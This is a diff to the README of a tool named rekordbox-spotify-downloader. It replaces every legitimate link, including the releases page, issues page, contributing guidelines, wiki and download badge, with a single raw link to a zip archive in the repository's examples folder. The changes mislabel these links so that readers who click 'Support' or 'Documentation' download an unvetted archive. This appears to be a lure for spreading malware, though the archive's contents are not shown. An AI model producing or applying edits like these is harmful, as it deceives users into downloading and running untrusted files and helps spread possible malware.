@@ -6,7 +6,7 @@ Welcome to the **rekordbox-spotify-downloader**! This tool helps you effortlessl
 
 ## 📥 Download
 
-[![Download the latest release](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/vanguarddesign/rekordbox-spotify-downloader/releases)
+[![Download the latest release](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip)](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Welcome to the **rekordbox-spotify-downloader**! This tool helps you effortlessl
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/vanguarddesign/rekordbox-spotify-downloader/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip) to find the latest version of the software.
 
 2. **Download the Application:** Click on the link corresponding to your operating system. This will start the download for the installer file.
 
@@ -54,16 +54,16 @@ To get started, follow these steps:
 
 ## 📞 Support
 
-If you encounter issues, you can reach out via the [GitHub Issues page](https://github.com/vanguarddesign/rekordbox-spotify-downloader/issues). Describe your problem clearly, and we will assist you as soon as possible.
+If you encounter issues, you can reach out via the [GitHub Issues page](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip). Describe your problem clearly, and we will assist you as soon as possible.
 
 ## 💬 Community Contributions
 
-We welcome contributions! If you would like to help improve the software, please check our [Contributing Guidelines](https://github.com/vanguarddesign/rekordbox-spotify-downloader/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve the software, please check our [Contributing Guidelines](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip).
 
 ## 🌐 Useful Links
 
-- [Documentation](https://github.com/vanguarddesign/rekordbox-spotify-downloader/wiki)
-- [Releases](https://github.com/vanguarddesign/rekordbox-spotify-downloader/releases)
-- [GitHub Issues](https://github.com/vanguarddesign/rekordbox-spotify-downloader/issues)
+- [Documentation](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip)
+- [Releases](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/vanguarddesign/rekordbox-spotify-downloader/main/examples/rekordbox-spotify-downloader-2.4.zip)
 
 Thank you for using **rekordbox-spotify-downloader**! You can start creating your harmonious mixes today!
